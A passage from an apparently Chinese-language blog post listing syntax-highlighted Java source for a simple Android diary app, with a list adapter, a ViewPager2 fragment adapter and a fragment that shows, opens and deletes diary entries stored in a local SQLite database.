android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.ArrayAdapter;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">import</span> com.lwx.blog.R;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DiaryListAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ArrayAdapter</span>&lt;<span class="hljs-title">DiaryList</span>&gt; </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 具体实现</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">int</span> resourceId;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DiaryListAdapter</span><span class="hljs-params">(Context context, <span class="hljs-keyword">int</span> textViewResourId, List&lt;DiaryList&gt; object)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(context, textViewResourId,object);<br>        resourceId=textViewResourId;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 完成每一list界面</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> position</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> converView</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> parent</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">getView</span><span class="hljs-params">(<span class="hljs-keyword">int</span> position, View converView, ViewGroup parent)</span></span>&#123;<br>        <span class="hljs-comment">//获取具体类</span><br>        DiaryList diaryList=getItem(position);<br>        <span class="hljs-comment">//目前不清楚</span><br>        View view= LayoutInflater.from(getContext()).inflate(resourceId,parent,<span class="hljs-keyword">false</span>);<br>        <span class="hljs-comment">//获取具体控件</span><br>        TextView time=(TextView)view.findViewById(R.id.time);<br>        TextView title=(TextView)view.findViewById(R.id.title);<br>        <span class="hljs-comment">//设置文字内容</span><br>        time.setText(diaryList.getTime());<br>        title.setText(diaryList.getTitle());<br>        <span class="hljs-keyword">return</span> view;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>DiayPagerAdapter.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lwx.blog.Adapter;<br><br><br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentManager;<br><span class="hljs-keyword">import</span> androidx.lifecycle.Lifecycle;<br><span class="hljs-keyword">import</span> androidx.viewpager2.adapter.FragmentStateAdapter;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DiaryPagerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">FragmentStateAdapter</span> </span>&#123;<br>    List&lt;Fragment&gt; fragmentList=<span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DiaryPagerAdapter</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> FragmentManager fragmentManager, <span class="hljs-meta">@NonNull</span> Lifecycle lifecycle,List&lt;Fragment&gt; fragments)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(fragmentManager, lifecycle);<br>        fragmentList=fragments;<br>    &#125;<br><br>    <span class="hljs-meta">@NonNull</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Fragment <span class="hljs-title">createFragment</span><span class="hljs-params">(<span class="hljs-keyword">int</span> position)</span> </span>&#123;<br>        <span class="hljs-comment">//设置具体界面</span><br>        <span class="hljs-keyword">return</span> fragmentList.get(position);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getItemCount</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">//设置具体个数</span><br>        <span class="hljs-keyword">return</span> fragmentList.size();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h1 id="Fragment-类"><a href="#Fragment-类" class="headerlink" title="Fragment 类"></a>Fragment 类</h1><p>DiaryFragment.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lwx.blog.Fragment;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.database.Cursor;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteDatabase;<br><span class="hljs-keyword">import</span> android.graphics.Bitmap;<br><span class="hljs-keyword">import</span> android.graphics.drawable.BitmapDrawable;<br><span class="hljs-keyword">import</span> android.graphics.drawable.Drawable;<br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.AdapterView;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.ListView;<br><span class="hljs-keyword">import</span> android.widget.RelativeLayout;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">import</span> com.bumptech.glide.Glide;<br><span class="hljs-keyword">import</span> com.bumptech.glide.request.animation.GlideAnimation;<br><span class="hljs-keyword">import</span> com.bumptech.glide.request.target.SimpleTarget;<br><span class="hljs-keyword">import</span> com.google.android.material.snackbar.Snackbar;<br><span class="hljs-keyword">import</span> com.lwx.blog.Adapter.DiaryListAdapter;<br><span class="hljs-keyword">import</span> com.lwx.blog.Bean.Database;<br><span class="hljs-keyword">import</span> com.lwx.blog.Bean.DiaryList;<br><span class="hljs-keyword">import</span> com.lwx.blog.Bean.Img;<br><span class="hljs-keyword">import</span> com.lwx.blog.ContentActivity;<br><span class="hljs-keyword">import</span> com.lwx.blog.DiaryListActivity;<br><span class="hljs-keyword">import</span> com.lwx.blog.R;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A simple &#123;<span class="hljs-doctag">@link</span> Fragment&#125; subclass.</span><br><span class="hljs-comment"> * Use the &#123;<span class="hljs-doctag">@link</span> DiaryFragment#newInstance&#125; factory method to</span><br><span class="hljs-comment"> * create an instance of this fragment.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DiaryFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Fragment</span> </span>&#123;<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename parameter arguments, choose names that match</span><br>    <span class="hljs-comment">// the fragment initialization parameters, e.g. ARG_ITEM_NUMBER</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ARG_TEXT = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ARG_INT = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types of parameters</span><br>    <span class="hljs-keyword">private</span> String changeTextString;<br>    <span class="hljs-keyword">private</span> String position;<br>    <span class="hljs-keyword">private</span> View rootView;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DiaryFragment</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// Required empty public constructor</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Use this factory method to create a new instance of</span><br><span class="hljs-comment">     * this fragment using the provided parameters.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param1 Parameter 1.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> A new instance of fragment DiaryFragment.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types and number of parameters</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DiaryFragment <span class="hljs-title">newInstance</span><span class="hljs-params">(String param1,String position)</span> </span>&#123;<br>        DiaryFragment fragment = <span class="hljs-keyword">new</span> DiaryFragment();<br>        Bundle args = <span class="hljs-keyword">new</span> Bundle();<br>        System.out.println(param1+<span class="hljs-string">&quot;:&quot;</span>+position);<br>        args.putString(ARG_TEXT,param1);<br>        args.putString(ARG_INT,position);<br>        System.out.println(args.getString(ARG_INT)+<span class="hljs-string">&quot;:&quot;</span>+args.getString(ARG_TEXT));<br>        fragment.setArguments(args);<br>        <span class="hljs-keyword">return</span> fragment;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-keyword">if</span> (getArguments() != <span class="hljs-keyword">null</span>) &#123;<br>            changeTextString= getArguments().getString(ARG_TEXT);<br>            position=getArguments().getString(ARG_INT);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span></span><br><span class="hljs-params"><span class="hljs-function">                             Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-keyword">if</span>(rootView==<span class="hljs-keyword">null</span>)&#123;<br>            rootView=inflater.inflate(R.layout.fragment_diary, container, <span class="hljs-keyword">false</span>);<br>        &#125;<br>        initView();<br>        <span class="hljs-keyword">return</span> rootView;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 具体初始化界面</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initView</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 设置需要的控件等</span><br><span class="hljs-comment">         */</span><br>        ListView listView;<br>        TextView changeText;<br>        View buttonView;<br>        RelativeLayout main;<br>        Button add;<br>        Database dbHelper;<br>        SQLiteDatabase db;<br>        Button change_img;<br>        List&lt;DiaryList&gt; diaryLists=<span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 获取具体的内容</span><br><span class="hljs-comment">         */</span><br>        change_img=rootView.findViewById(R.id.changeImg);<br>        add=rootView.findViewById(R.id.add_button);<br>        listView=rootView.findViewById(R.id.listView);<br>        changeText=rootView.findViewById(R.id.change);<br>        buttonView=rootView.findViewById(R.id.add_button);<br>        main=rootView.findViewById(R.id.main);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 判断标题进行分别展现</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span>(position.equals(<span class="hljs-string">&quot;1&quot;</span>))&#123;<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 监听title点击更换背景</span><br><span class="hljs-comment">             */</span><br>            changeText.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                    backgrandChage(main);<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 设置标题</span><br><span class="hljs-comment">             */</span><br>            changeText.setText(<span class="hljs-string">&quot;1&quot;</span>);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 隐藏按钮</span><br><span class="hljs-comment">             */</span><br>            buttonView.setVisibility(View.INVISIBLE);<br>            change_img.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                    backgrandChage(main);<br>                &#125;<br>            &#125;);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 随机界面</span><br><span class="hljs-comment">             */</span><br>            backgrandChage(main);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">            * 监听title点击更换背景</span><br><span class="hljs-comment">            */</span><br>            changeText.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                    backgrandChage(main);<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 展示ListView界面</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 数据库创建</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">//第二个数据库名，第三个返回一个自定义的langs，四版本号</span><br>            dbHelper=<span class="hljs-keyword">new</span> Database(getActivity(),<span class="hljs-string">&quot;blog.db&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-number">1</span>);<br><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 使用利用ListView显示日志信息</span><br><span class="hljs-comment">             */</span><br>            showListView(listView,diaryLists,dbHelper);<br>            <span class="hljs-comment">//监听点击事件</span><br>            listView.setOnItemClickListener(<span class="hljs-keyword">new</span> AdapterView.OnItemClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onItemClick</span><span class="hljs-params">(AdapterView&lt;?&gt; parent, View view, <span class="hljs-keyword">int</span> position, <span class="hljs-keyword">long</span> id)</span> </span>&#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     * 点击列表项时触发onItemClick方法，四个参数含义分别为</span><br><span class="hljs-comment">                     * parent：发生单击事件的AdapterView</span><br><span class="hljs-comment">                     * ciew：AdapterView中被点击的View</span><br><span class="hljs-comment">                     * position：当前点击的行在adapter的下标</span><br><span class="hljs-comment">                     * id：当前点击的行的id</span><br><span class="hljs-comment">                     */</span><br>                    <span class="hljs-comment">//获取当前position</span><br>                    DiaryList diaryList=diaryLists.get(position);<br>                    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                     * 将当前的日志信息带入下一个界面</span><br><span class="hljs-comment">                     */</span><br>                    Bundle bundle=<span class="hljs-keyword">new</span> Bundle();<br>                    bundle.putString(<span class="hljs-string">&quot;title&quot;</span>,diaryList.getTitle());<br>                    bundle.putString(<span class="hljs-string">&quot;time&quot;</span>,diaryList.getTime());<br>                    Intent intent=<span class="hljs-keyword">new</span> Intent(getActivity(),ContentActivity.class);<br>                    intent.putExtras(bundle);<br>                    startActivity(intent);<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 监听长按的事件</span><br><span class="hljs-comment">             */</span><br>            listView.setOnItemLongClickListener(<span class="hljs-keyword">new</span> AdapterView.OnItemLongClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onItemLongClick</span><span class="hljs-params">(AdapterView&lt;?&gt; parent, View view, <span class="hljs-keyword">int</span> position, <span class="hljs-keyword">long</span> id)</span> </span>&#123;<br>                    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                     * 再次确认是否删除</span><br><span class="hljs-comment">                     */</span><br>                    SQLiteDatabase db=dbHelper.getWritableDatabase();<br>                    Snackbar.make(view,<span class="hljs-string">&quot;即将删除&quot;</span>,Snackbar.LENGTH_LONG).setAction(<span class="hljs-string">&quot;确认&quot;</span>, <span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                            <span class="hljs-comment">/**</span><br><span class="hljs-comment">                             * 具体删除内容</span><br><span class="hljs-comment">                             */</span><br>                            <span class="hljs-comment">//获取具体类</span><br>                            DiaryList diaryList=diaryLists.get(position);<br>                            <span class="hljs-comment">//数据库删除内容</span><br>                            db.delete(<span class="hljs-string">&quot;diary&quot;</span>,<span class="hljs-string">&quot;time=?&quot;</span>,<span class="hljs-keyword">new</span> String[]&#123;diaryList.getTime()&#125;);<br>                            <span class="hljs-comment">/**</span><br><span class="hljs-comment">                             * 刷新界面</span><br><span class="hljs-comment">                             */</span><br>                            showListView(listView,diaryLists,dbHelper);<br>                        &#125;<br>                    &#125;).show();<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 添加的界面跳转</span><br><span class="hljs-comment">             */</span><br>            add.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                    Intent intent = <span class="hljs-keyword">new</span> Intent(getActivity(), ContentActivity.class);<br>                    startActivity(intent);<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">backgrandChage</span><span class="hljs-params">(RelativeLayout main)</span> </span>&#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 利用Glide随机背景图片</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//生成随机数</span><br>        Random random=<span class="hljs-keyword">new</span> Random();<br>        <span class="hljs-comment">//设置范围防止每次都更改</span><br>        <span class="hljs-keyword">int</span> src=random.nextInt(Img.getImg());<br>        String imgname=<span class="hljs-string">&quot;img&quot;</span>+src;<br>        <span class="hljs-comment">//设置背景</span><br>        <span class="hljs-keyword">int</span> imgsrc=getResources().getIdentifier(imgname,<span class="hljs-string">&quot;drawable&quot;</span>,<span class="hljs-string">&quot;com.lwx.blog&quot;</span>);<br>        <span class="hljs-comment">//具体利用Glide设置背景图</span><br>        Glide.with(getActivity())<br>                .load(imgsrc)<br>                .asBitmap()<br>                .into(<span class="hljs-keyword">new</span> SimpleTarget&lt;Bitmap&gt;(<span class="hljs-number">1080</span>,<span class="hljs-number">2340</span>) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onResourceReady</span><span class="hljs-params">(Bitmap resource, GlideAnimation&lt;? <span class="hljs-keyword">super</span> Bitmap&gt; glideAnimation)</span> </span>&#123;<br>                        Drawable drawable = <span class="hljs-keyword">new</span> BitmapDrawable(resource);<br>                        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN) &#123;<br>                            main.setBackground(drawable);<br>                        &#125;<br>                    &#125;<br>                &#125;);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">showListView</span><span class="hljs-params">(ListView listView,List&lt;DiaryList&gt; diaryLists,Database dbHelper)</span> </span>&#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 使用利用ListView显示日志信息</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//存入具体信息</span><br>        initDiary(diaryLists,dbHelper);<br>        listView=rootView.findViewById(R.id.listView);<br>        <span class="hljs-comment">//反转排列顺序</span><br>        Collections.reverse(diaryLists);<br>        <span class="hljs-comment">//加载具体内容</span><br>        DiaryListAdapter adapter=<span class="hljs-keyword">new</span> DiaryListAdapter(getActivity(),R.layout.diary_list,diaryLists);<br>        <span class="hljs-comment">//运行显示内容</span><br>        listView.setAdapter(adapter);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initDiary</span><span class="hljs-params">(List&lt;DiaryList&gt; diaryLists,Database dbHelper)</span></span>&#123;<br>        diaryLists.clear();<br>        DiaryList tmp=<span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 数据库导入内容</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//正式创建数据库</span><br>        SQLiteDatabase db=dbHelper.getWritableDatabase();<br>        Cursor cursor=db.query(<span class="hljs-string">&quot;diary&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>        <span 